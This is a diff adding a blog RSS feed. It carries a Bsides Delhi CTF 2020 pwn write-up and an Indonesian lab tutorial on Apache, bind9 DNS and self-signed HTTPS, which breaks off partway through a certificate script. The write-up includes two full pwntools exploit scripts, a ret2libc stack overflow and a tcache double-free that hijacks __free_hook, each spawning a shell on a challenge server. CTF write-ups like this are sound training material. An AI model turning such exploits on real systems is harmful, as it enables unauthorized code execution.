@@ -1,0 +1,1154 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Hello World. I am Dito Prabowo</title>
+        <link>/posts/</link>
+        <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <lastBuildDate>Sun, 11 Oct 2020 06:32:57 +0700</lastBuildDate>
+        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Writeup PWN Bsides Delhi CTF 2020</title>
+            <link>/posts/writeup-pwn-bsides-delhi-ctf-2020/</link>
+            <pubDate>Sun, 11 Oct 2020 06:32:57 +0700</pubDate>
+            
+            <guid>/posts/writeup-pwn-bsides-delhi-ctf-2020/</guid>
+            <description>Play Bsides Delhi CTF with Heroes Cyber Security, we have got 1st Place. Here for PWN Writeups
+Thanks for Attending Binary Security Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Vuln int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // ebp  int v5; // [esp-28h] [ebp-28h]  int v6; // [esp-4h] [ebp-4h]  __asm { endbr32 } v6 = v3; sub_80490C0(stdin, 0, 2, 0); sub_80490C0(stdout, 0, 2, 0); sub_80490C0(stderr, 0, 2, 0); sub_80490A0(&amp;#34;It&amp;#39;s been fun, but here we are at the final challenge!</description>
+            <content type="html"><![CDATA[<p>Play Bsides Delhi CTF with Heroes Cyber Security, we have got 1st Place. Here for PWN Writeups</p>
+<h1 id="thanks-for-attending">Thanks for Attending</h1>
+<h3 id="binary-security">Binary Security</h3>
+<pre tabindex="0"><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+</code></pre><h3 id="vuln">Vuln</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// ebp
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [esp-28h] [ebp-28h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [esp-4h] [ebp-4h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">__asm</span> { endbr32 }
+  v6 <span style="color:#f92672">=</span> v3;
+  sub_80490C0(stdin, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+  sub_80490C0(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+  sub_80490C0(stderr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+  sub_80490A0(<span style="color:#e6db74">&#34;It&#39;s been fun, but here we are at the final challenge!&#34;</span>);
+  sub_80490A0(<span style="color:#e6db74">&#34;May I know your name?&#34;</span>);
+  sub_80490D0(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#f92672">&amp;</span>v5);
+  sub_8049090(<span style="color:#e6db74">&#34;It&#39;s been nice meeting you, %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>v5);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>When we see above code when reversing, we notice that the program input name on var v5 with scanf using <code>%s</code> argument. If program use <code>%s</code> for input, the program will take input without limiting the number of inputs. So with this vuln we can do Ret2libc and get shell.</p>
+<h3 id="payload">Payload</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+<span style="color:#75715e">#MyTemplate</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>)
+
+lokal <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
+<span style="color:#75715e">#context.arch = &#39;&#39;</span>
+
+sla  <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendlineafter(delim,data)
+ru   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :xp<span style="color:#f92672">.</span>recvuntil(delims, drop)
+uu32 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x                  :u32(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+	Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+<span style="color:#66d9ef">else</span>:
+	Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+
+<span style="color:#66d9ef">if</span> lokal:
+    xp <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path])
+<span style="color:#66d9ef">else</span>:
+    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;13.233.104.112&#39;</span>
+    port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;2222&#39;</span>
+    xp <span style="color:#f92672">=</span> remote(host,port)
+
+<span style="color:#66d9ef">if</span> Debug:
+    context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>,<span style="color:#e6db74">&#34;splitw&#34;</span>,<span style="color:#e6db74">&#34;-h&#34;</span>]
+    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    gdb<span style="color:#f92672">.</span>attach(xp,cmd)
+
+
+<span style="color:#75715e">#Exploit Here</span>
+puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+main <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+libcstart <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
+
+p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
+p <span style="color:#f92672">+=</span> p32(puts)
+p <span style="color:#f92672">+=</span> p32(main)
+p <span style="color:#f92672">+=</span> p32(libcstart)
+
+sla(<span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,p)
+ru(<span style="color:#e6db74">&#34;!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+leak <span style="color:#f92672">=</span> uu32(xp<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">4</span>))
+print hex(leak)
+
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18da0</span>
+print libc<span style="color:#f92672">.</span>address
+
+system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+binsh <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>next()
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
+payload <span style="color:#f92672">+=</span> p32(system)
+payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)
+payload <span style="color:#f92672">+=</span> p32(binsh)
+sla(<span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,payload)
+
+xp<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Flag : <code>BSDCTF{3xpl0r1ng_th3_unkn0wn}</code></p>
+<h1 id="too-lazyyy">Too lazyyy</h1>
+<h3 id="binary-security-1">Binary Security</h3>
+<pre tabindex="0"><code>Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+</code></pre><h3 id="vuln-1">Vuln</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> __usercall deleteChunk<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rax<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rbp<span style="color:#f92672">&gt;</span>)
+{
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp-Ch] [rbp-Ch]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp-8h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">__asm</span> { endbr64 }
+  v3 <span style="color:#f92672">=</span> a1;
+  sub_1110(<span style="color:#e6db74">&#34;Enter index &gt;&gt; &#34;</span>);
+  v2 <span style="color:#f92672">=</span> getInt(<span style="color:#e6db74">&#34;Enter index &gt;&gt; &#34;</span>);
+  <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>array[v2] )
+  {
+    sub_1110(<span style="color:#e6db74">&#34;Invalid&#34;</span>);
+    sub_1170(<span style="color:#ae81ff">0LL</span>);
+  }
+  sub_10E0(array[v2]);
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sub_10F0</span>(<span style="color:#e6db74">&#34;Success&#34;</span>);
+}
+</code></pre></div><p>Vuln is in function deleteChunk, it free chunk but not delete array chunk in bss, which mean this can make Use After Free and we can do Double Free for Arbitrary write.</p>
+<ol>
+<li>Add chunk with size 0x80 #0</li>
+<li>Add chunk with size 0x18 #1 (to prevent consolidate with top chunk)</li>
+<li>Delete chunk #0 8 time to fill tcache and get unsorted bin</li>
+<li>Leak libc with view(0)</li>
+<li>Do Double free on chunk #1</li>
+<li>Arbitrary Write to __free_hook</li>
+<li>Change with system or one_gadgets (my payload use one_gadgets)</li>
+</ol>
+<h3 id="payload-1">Payload</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+<span style="color:#75715e">#MyTemplate</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>)
+
+lokal <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+<span style="color:#75715e">#context.arch = &#39;&#39;</span>
+
+sa   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendafter(delim,data)
+sla  <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendlineafter(delim,data)
+ru   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :xp<span style="color:#f92672">.</span>recvuntil(delims, drop)
+uu64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x                  :u64(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+	Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+<span style="color:#66d9ef">else</span>:
+	Debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+
+<span style="color:#66d9ef">if</span> lokal:
+    xp <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path])
+<span style="color:#66d9ef">else</span>:
+    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;13.233.104.112&#39;</span>
+    port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1111&#39;</span>
+    xp <span style="color:#f92672">=</span> remote(host,port)
+
+<span style="color:#66d9ef">if</span> Debug:
+    context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>,<span style="color:#e6db74">&#34;splitw&#34;</span>,<span style="color:#e6db74">&#34;-h&#34;</span>]
+    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    gdb<span style="color:#f92672">.</span>attach(xp,cmd)
+
+
+<span style="color:#75715e">#Exploit Here</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size,content):
+	sla(<span style="color:#e6db74">&#34;Choice &gt;&gt; &#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>)
+	sla(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>,str(size))
+	sa(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>,content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(idx):
+	sla(<span style="color:#e6db74">&#34;Choice &gt;&gt; &#34;</span>,<span style="color:#e6db74">&#34;2&#34;</span>)
+	sla(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>,str(idx))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
+	sla(<span style="color:#e6db74">&#34;Choice &gt;&gt; &#34;</span>,<span style="color:#e6db74">&#34;3&#34;</span>)
+	sla(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>,str(idx))
+
+add(<span style="color:#ae81ff">0x80</span>,<span style="color:#e6db74">&#34;A&#34;</span>)
+add(<span style="color:#ae81ff">18</span>,<span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+	free(<span style="color:#ae81ff">0</span>)
+
+view(<span style="color:#ae81ff">0</span>)
+ru(<span style="color:#e6db74">&#34;data:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+leaklibc <span style="color:#f92672">=</span>  uu64(xp<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+print hex(leaklibc)
+
+libc <span style="color:#f92672">=</span> leaklibc <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3ebca0</span>
+free_hook <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3ed8e8</span>
+free(<span style="color:#ae81ff">1</span>)
+free(<span style="color:#ae81ff">1</span>)
+add(<span style="color:#ae81ff">0x18</span>,p64(libc<span style="color:#f92672">+</span>free_hook)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+add(<span style="color:#ae81ff">0x18</span>,p64(libc<span style="color:#f92672">+</span>free_hook)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+one <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f3c2</span>
+add(<span style="color:#ae81ff">0x18</span>,p64(one))
+free(<span style="color:#ae81ff">0</span>)
+
+xp<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Flag : <code>BSDCTF{Tcach3_1s_w4y_easi3r_than_f4stbins}</code></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>[LAB] Install Web Server With Private DNS and Secure With HTTPS</title>
+            <link>/posts/lab-install-web-server-with-private-dns-and-secure-with-https/</link>
+            <pubDate>Wed, 16 Oct 2019 09:09:46 +0700</pubDate>
+            
+            <guid>/posts/lab-install-web-server-with-private-dns-and-secure-with-https/</guid>
+            <description>0x0 Intro Sebelumnya saya jelaskan tujuan dari lab ini, yaitu kita membuat web server disini saya menggunakan apache, lalu Install bind9 untuk dns server dan membuat domain private kita sendiri, setelah bisa kita secure dengan HTTPS caranya dengan self signed certificate.
+Sebelumnya siapkan server yang akan kita gunakan, lalu pahami design jaringan dari server anda, disini saya menggunakan pengaturan network bridge dan menggunakan koneksi dari WIFI B201AP.
+IP server : 10.</description>
+            <content type="html"><![CDATA[<h3 id="0x0-intro">0x0 Intro</h3>
+<p>Sebelumnya saya jelaskan tujuan dari lab ini, yaitu kita membuat web server disini saya menggunakan apache, lalu Install bind9 untuk dns server dan membuat domain private kita sendiri, setelah bisa kita secure dengan HTTPS caranya dengan self signed certificate.</p>
+<p>Sebelumnya siapkan server yang akan kita gunakan, lalu pahami design jaringan dari server anda, disini saya menggunakan pengaturan network bridge dan menggunakan koneksi dari WIFI B201AP.</p>
+<p>IP server : 10.122.1.70
+IP laptop : 10.122.1.53</p>
+<p>silakan gunakan design jaringan kalian sendiri.</p>
+<h3 id="0x1-install-web-server">0x1 Install Web Server</h3>
+<p>Web server yang saya gunakan adalah apache2, untuk install gunakan command berikut :</p>
+<pre><code> $ sudo apt-get install apache2
+</code></pre>
+<p>setelah selesai, tanpa disetting apapun harusnya jika dibuka ip anda disini saya (10.122.1.70) sudah menampilkan web apache.</p>
+<p>untuk mengganti isi web, dapat di replace file di /var/www/html, disini saya mengganti default index.html dengan web saya, berikut hasilnya :</p>
+<p><img src="/img/webj1.png" alt=""></p>
+<h3 id="0x2-install-private-dns">0x2 Install Private DNS</h3>
+<p>Untuk menggunakan Private DNS saya menggunakan service bind9, dan membuat DNS di ip server yaitu 10.122.1.70</p>
+<p>Bind9 adalah suatu software yang di buat untuk mengatur DNS Server pada sistem operasi linux.</p>
+<p>Jenis-jenis DNS dan Fungsinya</p>
+<ol>
+<li>A Record, yaitu memetakan hostname ke IP adress 32-bit (IPv4).</li>
+<li>AAA Record, yaitu memetakan hostname ke IP address 128-bit (IPv6).</li>
+<li>MX Record, memetakan domain ke mail exchange server.</li>
+<li>CNAME Record, membuat nama alias dari sebuah domain.</li>
+<li>NS Record, memtakan domain ke dalam satu daftar dari DNS Server.</li>
+</ol>
+<p>Untuk membuat domain kita sendiri, ada 3 hal yang harus kita lakukan :</p>
+<ol>
+<li>Configuring the Local File</li>
+<li>Creating the Forward Zone File</li>
+<li>Creating the Reverse Zone File(s)</li>
+</ol>
+<p>Selanjutnya kita mulai proses install dan konfigurasinya.</p>
+<ul>
+<li>
+<p>install dulu bind9 nya :</p>
+<p>$  sudo apt-get install bind9</p>
+</li>
+<li>
+<p>Selanjutnya configure local file</p>
+<pre><code>$  sudo vim /etc/bind/named.conf.local
+</code></pre>
+</li>
+</ul>
+<pre tabindex="0"><code>//
+// Do any local configuration here
+//
+
+// Consider adding the 1918 zones here, if they are not used in your
+// organization
+//include &quot;/etc/bind/zones.rfc1918&quot;;
+
+zone &quot;ditoprabowo.com&quot; {
+type master;
+file &quot;/etc/bind/zones/ditoprabowo.com.db&quot;;
+};
+
+zone &quot;1.122.10.in-addr.arpa&quot; {
+type master;
+file &quot;/etc/bind/zones/rev.1.122.10.in-addr.arpa&quot;;
+};
+</code></pre><p>1.122.10 merupakan 3 digit 10.122.1.70 yang dibalik.</p>
+<ul>
+<li>
+<p>Buat directory folder zones &amp; file di domain.com.db di directory /etc/bind [Forward Zone]</p>
+<pre><code>    $  cd /etc/bind
+    $  sudo mkdir zones
+    $  cd zones
+    $  vim ditoprabowo.com.db
+</code></pre>
+</li>
+</ul>
+<pre tabindex="0"><code>; BIND data file for ditoprabowo.com
+;
+$TTL 14400
+@ IN SOA ns1.ditoprabowo.com. root.ditoprabowo.com. (
+1 ; Serial  
+7200 ; Refresh  
+120 ; Retry
+2419200 ; Expire  
+604800) ; Default TTL  
+;
+
+ditoprabowo.com. IN NS ns1.ditoprabowo.com.
+ditoprabowo.com. IN MX 10 testing.ditoprabowo.com.
+ditoprabowo.com. IN A 10.122.1.70
+
+ns1 IN A 10.122.1.70
+
+www IN CNAME ditoprabowo.com.
+testing IN A 10.122.1.70
+ftp IN CNAME ditoprabowo.com.
+ditoprabowo.com. IN TXT &quot;v=spf1 ip4:10.122.1.70 a mx ~all&quot;
+testing IN TXT &quot;v=spf1 a -all&quot;
+</code></pre><ul>
+<li>
+<p>Creating the Reverse Zone File(s)</p>
+<pre><code>  $  sudo vim /etc/bind/zones/1.122.10.in-addr.arpa
+</code></pre>
+</li>
+</ul>
+<pre tabindex="0"><code>@ IN SOA ditoprabowo.com. root.ditoprabowo.com. (
+1;  
+28800;  
+604800;  
+604800;  
+86400 );
+
+@ IN NS ns1.ditoprabowo.com.  
+70 IN PTR ditoprabowo.com.
+</code></pre><p>ganti 70 dengan akhiran ip kalian. test dengan nslookup.</p>
+<ul>
+<li>
+<p>lalu kita coba test domain kita, caranya dengan menggunakan nameserver ip dns kita.</p>
+<pre><code>  $  sudo vim /etc/resolv.conf
+</code></pre>
+</li>
+</ul>
+<pre tabindex="0"><code>nameserver 10.122.1.70
+</code></pre><p>hasilnya :</p>
+<pre tabindex="0"><code>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.9-Ubuntu &lt;&lt;&gt;&gt; ditoprabowo.com
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45338
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: a631a242020ee04e76887a075da68f41f580d1ab13c184ba (good)
+;; QUESTION SECTION:
+;ditoprabowo.com.		IN	A
+
+;; ANSWER SECTION:
+ditoprabowo.com.	14400	IN	A	10.122.1.70
+
+;; AUTHORITY SECTION:
+ditoprabowo.com.	14400	IN	NS	ns1.ditoprabowo.com.
+
+;; ADDITIONAL SECTION:
+ns1.ditoprabowo.com.	14400	IN	A	10.122.1.70
+
+;; Query time: 0 msec
+;; SERVER: 10.122.1.70#53(10.122.1.70)
+;; WHEN: Wed Oct 16 03:32:17 UTC 2019
+;; MSG SIZE  rcvd: 122
+</code></pre><p>Testing pada selain server, gunakan dns ip server.</p>
+<p>configure dulu dns pada wifi, lalu coba buka ditoprabowo.com</p>
+<p><img src="/img/webj2.png" alt=""></p>
+<p><img src="/img/webj3.png" alt=""></p>
+<h3 id="0x3-secure-with-https">0x3 Secure With HTTPS</h3>
+<p><img src="/img/SSL-flowchart.png" alt=""></p>
+<p>nah kita bisa menggenerate certificate sendiri (Self-signed certificate) dengan openssl</p>
+<ol>
+<li>Generate a certificate authority (CA) cert</li>
+<li>Generate your Apache server SSL key and certificate</li>
+<li>Generate a client SSL certificate</li>
+</ol>
+<p>dan pada saat membuat server key jangan lupa ditambahkan DNS kita.</p>
+<p>Berikut script yang saya gunakan untuk Generate self-signed TLS Certificate yang isinya sebenernya seperti diatas step nya.</p>
+<pre tabindex="0"><code>#!/bin/bash
+
+# Directories
+cur=$(pwd)
+tmp=$(mktemp -d)
+scriptName=$(basename &quot;$0&quot;)
+
+# Certificate Variables
+OUTPATH=&quot;./&quot;
+VERBOSE=0
+DURATION=3650 # 10 years
+
+safeExit() {
+  if [ -d &quot;$tmp&quot; ]; then
+    if [ $VERBOSE -eq 1 ]; then
+      echo &quot;Removing temporary directory '${tmp}'&quot;
+    fi
+    rm -rf &quot;$tmp&quot;
+  fi
+
+  trap - INT TERM EXIT
+  exit
+}
+
+# Help Screen
+help() {
+  echo -n &quot;${scriptName} [OPTIONS] -c=US --state=California
+Generate self-signed TLS certificate using OpenSSL
+ Options:
+  -c|--country         Country Name (2 letter code)
+  -s|--state           State or Province Name (full name)
+  -l|--locality        Locality Name (eg, city)
+  -o|--organization    Organization Name (eg, company)
+  -u|--unit            Organizational Unit Name (eg, section)
+  -n|--common-name     Common Name (e.g. server FQDN or YOUR name)
+  -e|--email           Email Address
+  -p|--path            Path to output generated keys
+  -d|--duration        Validity duration of the certificate (in days)
+  -h|--help            Display this help and exit
+  -v|--verbose         Verbose output
+&quot;
+}
+
+# Test output path is valid
+testPath() {
+  if [ ! -d $OUTPATH ]; then
+    echo &quot;The specified directory \&quot;${OUTPATH}\&quot; does not exist&quot;
+    exit 1
+  fi
+}
+
+# Process Arguments
+while [ &quot;$1&quot; != &quot;&quot; ]; do
+  PARAM=$(echo &quot;$1&quot; | awk -F= '{print $1}')
+  VALUE=$(echo &quot;$1&quot; | awk -F= '{print $2}')
+  case $PARAM in
+    -h|--help) help; safeExit ;;
+    -c|--country) C=$VALUE ;;
+    -s|--state) ST=$VALUE ;;
+    -l|--locality) L=$VALUE ;;
+    -o|--organization) O=$VALUE ;;
+    -u|--unit) OU=$VALUE ;;
+    -n|--common-name) CN=$VALUE ;;
+    -e|--email) emailAddress=$VALUE ;;
+    -p|--path) OUTPATH=$VALUE; testPath ;;
+	-d|--duration) DURATION=$VALUE ;;
+    -v|--verbose) VERBOSE=1 ;;
+    *) echo &quot;ERROR: unknown parameter \&quot;$PARAM\&quot;&quot;; help; exit 1 ;;
+  esac
+  shift
+done
+
+# Prompt for variables that were not provided in arguments
+checkVariables() {
+  # Country
+  if [ -z &quot;$C&quot; ]; then
+    echo -n &quot;Country Name (2 letter code) [AU]:&quot;
+    read -r C
+  fi
+
+  # State
+  if [ -z &quot;$ST&quot; ]; then
+    echo -n &quot;State or Province Name (full name) [Some-State]:&quot;
+    read -r ST
+  fi
+
+  # Locality
+  if [ -z &quot;$L&quot; ]; then
+    echo -n &quot;Locality Name (eg, city) []:&quot;
+    read -r L
+  fi
+
+  # Organization
+  if [ -z &quot;$O&quot; ]; then
+    echo -n &quot;Organization Name (eg, company) [Internet Widgits Pty Ltd]:&quot;
+    read -r O
+  fi
+
+  # Organizational Unit
+  if [ -z &quot;$OU&quot; ]; then
+    echo -n &quot;Organizational Unit Name (eg, section) []:&quot;
+    read -r OU
+  fi
+
+  # Common Name
+  if [ -z &quot;$CN&quot; ]; then
+    echo -n &quot;Common Name (e.g. server FQDN or YOUR name) []:&quot;
+    read -r CN
+  fi
+
+  # Email Address
+  if [ -z &quot;$emailAddress&quot; ]; then
+    echo -n &quot;Email Address []:&quot;
+    read -r emailAddress
+  fi
+}
+
+# Show variable values
+showVals() {
+  echo &quot;Country: ${C}&quot;;
+  echo &quot;State: ${ST}&quot;;
+  echo &quot;Locality: ${L}&quot;;
+  echo &quot;Organization: ${O}&quot;;
+  echo &quot;Organization Unit: ${OU}&quot;;
+  echo &quot;Common Name: ${CN}&quot;;
+  echo &quot;Email: ${emailAddress}&quot;;
+  echo &quot;Output Path: ${OUTPATH}&quot;;
+  echo &quot;Certificate Duration (Days): ${DURATION}&quot;;
+  echo &quot;Verbose: ${VERBOSE}&quot;;
+}
+
+# Init
+init() {
+  cd &quot;$tmp&quot; || exit
+  pwd
+}
+
+# Cleanup
+cleanup() {
+  echo &quot;Cleaning up&quot;
+  cd &quot;$cur&quot; || exit
+  rm -rf &quot;$tmp&quot;
+}
+
+buildCsrCnf() {
+cat &lt;&lt; EOF &gt; &quot;${tmp}/tmp.csr.cnf&quot;
+[req]
+default_bits = 2048
+prompt = no
+default_md = sha256
+distinguished_name = dn
+[dn]
+C=${C}
+ST=${ST}
+L=${L}
+O=${O}
+OU=${OU}
+CN=${CN}
+emailAddress=${emailAddress}
+EOF
+}
+
+buildExtCnf() {
+cat &lt;&lt; EOF &gt; &quot;${tmp}/v3.ext&quot;
+authorityKeyIdentifier=keyid,issuer
+basicConstraints=CA:FALSE
+keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
+subjectAltName = @alt_names
+[alt_names]
+DNS.1 = ${CN}
+DNS.2 = ditoprabowo.com
+DNS.3 = ns1.ditoprabowo.com
+DNS.4 = testing.ditoprabowo.com
+DNS.5 = 10.122.1.70
+EOF
+}
+
+# Build TLS Certificate
+build() {
+  # Santizie domain name for file name
+  FILENAME=${CN/\*\./}
+  # Generate CA key &amp; crt
+  openssl genrsa -out &quot;${tmp}/tmp.key&quot; 2048
